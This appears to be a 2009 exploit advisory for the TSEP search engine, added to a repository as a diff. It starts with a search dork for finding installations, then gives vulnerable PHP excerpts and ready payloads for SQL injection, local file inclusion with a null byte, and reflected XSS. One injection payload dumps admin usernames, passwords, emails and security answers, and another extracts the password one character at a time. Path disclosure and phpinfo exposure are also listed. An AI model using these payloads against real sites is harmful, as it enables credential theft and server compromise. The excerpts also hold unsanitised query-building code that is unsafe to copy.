@@ -1,0 +1,207 @@
+TSEP <=0.942.02 Vulnerabilities
+http://tsep.sourceforge.net
+
+Dork: "powered by TSEP - The Search Engine Project"
+
+(c)eLwaux 30.06.2009, uasc.org.ua
+
+
+## ## ## ## ## ## 
+
+Blind SQL-Inj
+/admin/rankform.php
+
+-----------------------------------------------------------------------------
+23:  // Delete the contents
+24:  if ((isset ($_POST["delete"])) && (isset ($_POST["deleteRank"]))) {
+25:   $percent = $_POST['deleteRank'];
+26:   $sql_del = "DELETE FROM $db_tablename WHERE valuepercent='$percent'";
+27:  
+28:   mysql_query($sql_del);
+29:  }
+-----------------------------------------------------------------------------
+
+exploit (BlindSQLinj after DELETE):
+POST: delete = .
+POST: deleteRank = '{SQL}-- 
+
+exploit2 (BlindSQLinj after UPDATE):
+POST: modify = .
+POST: modifyRank = . 
+POST: display = .
+POST: comment = .
+POST: alt = .
+POST: percent = '{SQL}-- 
+
+
+
+
+## ## ## ## ## ## 
+
+SQL-Inj
+/admin/rankform.php
+
+-----------------------------------------------------------------------------
+54:  if ((isset ($_POST["insert"])) && (isset ($_POST["insertNewRank"]))) {
+55:   $alt           = $_POST['alt'];
+56:   $image_show    = $_POST['image_show'];
+57:   $comment       = $_POST['comment'];
+58:   $percent       = $_POST['percent'];
+59: $display       = reslash($_POST['display']);
+60:
+61: if (($percent > "0") && ($percent <= "100")) {
+62: $sql_ins = "INSERT INTO $db_tablename (alt_tag,display,valuepercent,image_show,comment)
+63:    VALUES ('$alt','$display','$percent','$image_show','$comment')";
+64:         mysql_query($sql_ins);
+65: }
+66: $sql_upd = "UPDATE $db_tablename SET image_show='$image_show'";
+67: mysql_query($sql_upd);
+68:
+69:  }
+-----------------------------------------------------------------------------
+
+exploit:
+POST: insertNewRank = .
+POST: insert = .
+POST: percent = 1
+POST: alt = 1',( select concat_ws(0x3a,username,passwd,email,question,answer) from tsep_users ),1,1,1);-- 
+POST: image_show = 1
+POST: comment = 1
+POST: display = 1
+then goto /admin/rankform.php and look admin name & passwd & email & question and answer
+
+
+
+## ## ## ## ## ## 
+
+LFI
+/admin/index.php
+
+-----------------------------------------------------------------------------
+335:  if ( isset( $_POST ) and count( $_POST ) > 0 ) {
+336:      $_GET = $_POST;
+337:  }
+338:  if ( !isset($_GET["lang"]) )
+339:   if ( !isset($_SESSION["lang"]) )
+340:   $_GET["lang"] = "en_US";
+341:   else
+342:   $_GET["lang"] = $_SESSION["lang"];
+345:  if ( $_GET["lang"] != "en_US" )
+345:   require_once( "../language/" . $_GET["lang"] . "/language.php" );
+-----------------------------------------------------------------------------
+
+exploit:
+GET: /admin/?lang=../{FILE.PHP}%00
+
+
+
+
+
+## ## ## ## ## ## 
+
+Blind SQL-inj
+/admin/indexoverview.php
+
+-----------------------------------------------------------------------------
+29: if (isset($_GET['order'])) // for userdefined search order, otherwise sort by time of entry: Title ASC
+30: { // write new values
+31: $db_tablename = $db_table_prefix."internal";
+32: $query = "UPDATE $db_tablename SET stringvalue='".$_GET['order']."' WHERE description='tsepindexovervieworder'";
+33: $result = mysql_query($query, $tsepdbconnection) or die(mysql_error());
+34: $query = "UPDATE $db_tablename SET stringvalue='".$_GET['dir']."' WHERE description='tsepindexoverviewdirection'";
+35: $result = mysql_query($query, $tsepdbconnection) or die(mysql_error());
+36: }
+-----------------------------------------------------------------------------
+
+exploit:
+GET: order = '+and+1=if(select+ascii(lower(substring(passwd,1,1)))>90+from+tsep_users+where+username='adminame',1,0)-- 
+
+
+
+
+
+## ## ## ## ## ## 
+
+XSS
+/admin/configuration.php
+
+-----------------------------------------------------------------------------
+137:     <form name="tsepconfig" id="tsepconfig" method="post" action="<?php echo $_SERVER["PHP_SELF"]; ?>">
+154:     <form name="frmMaxResultNew" id="frmMaxResultNew" method="POST" action="<?php echo $_SERVER["PHP_SELF"]; ?>">
+164:     <form name="frmMaxR....ckForm" id="frmMaxResult" method="POST" action="<?php echo $_SERVER["PHP_SELF"]; ?>">
+-----------------------------------------------------------------------------
+
+exploit:
+GET: /configuration.php/"><script>alert(/xss/);</script><a%20"
+
+
+
+## ## ## ## ## ## 
+
+XSS
+/admin/index.php
+
+-----------------------------------------------------------------------------
+97:    if ( isset( $_GET["errorMsg"] ) ) {
+100:        $html .= "            <td class=\"errorMessage\">".addslashes( $_GET["errorMsg"] )."</td>\n";
+107:        unset( $_GET["errorMsg"] );
+108:    }
+-----------------------------------------------------------------------------
+
+exploit:
+GET: /admin/?errorMsg=<script>alert(/xss/);</script>
+
+
+
+
+## ## ## ## ## ## 
+
+Path disk:
+-----------------------------------------------------------------------------
+/admin/examples/phpcrawl4tsep.php
+/admin/examples/fillwithcontent.php
+/admin/examples/urllist.php
+/include/indexingtimetaken.php
+/include/timeneeded.php
+/include/colorcycle.php
+/include/dbconnection.php
+/include/resultnumber.php
+/include/copyright.php
+/include/notifyofstopwords.php
+/inclued/oldmysqltell.php
+/include/indexstatus.php
+/include/pagenavigation.php
+/include/searchterm.php
+/include/stampittimestamp.php
+/include/ranking.php
+/include/ipfunctions.php
+/include/indexer_search_table.php
+/include/printpagedetails.php
+/include/deletefile.php
+/include/uploadfile.php
+/include/configfunctions.php
+-----------------------------------------------------------------------------
+
+
+
+
+
+## ## ## ## ## ## 
+
+PHPINFO:
+-----------------------------------------------------------------------------
+/admin/tsepinfo.php
+-----------------------------------------------------------------------------
+
+
+
+
+## ## ## ## ## ## 
+
+others's exploits:
+/admin/configcontentimages.php/">{XSS}<"
+/include/indexer_search_table.php?tsep_lng[help_copyright]=">{XSS}<"
+/tsepsearch.php?q=sa&s=0&e=10&user_e=10/">{XSS}<a"
+/tsepsearch.php?q={XSS}&s=0&e=10/&user_e=10
+
+# milw0rm.com [2009-06-30]
